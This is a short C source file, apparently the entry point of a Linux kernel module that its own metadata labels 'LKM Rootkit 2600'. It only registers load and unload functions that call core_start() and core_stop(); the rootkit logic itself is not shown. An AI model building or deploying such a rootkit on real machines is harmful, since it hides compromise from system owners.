#include "core.h"

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("");
MODULE_DESCRIPTION("LKM Rootkit 2600");
MODULE_VERSION("0.1.0");

static int __init mod_init(void)
{
    DEBUG("LKM rootkit loaded\n");

    core_start();
    return 0;
}

static void __exit mod_exit(void)
{
    core_stop();

    DEBUG("LKM rootkit unloaded\n");
}

module_init(mod_init);
module_exit(mod_exit);
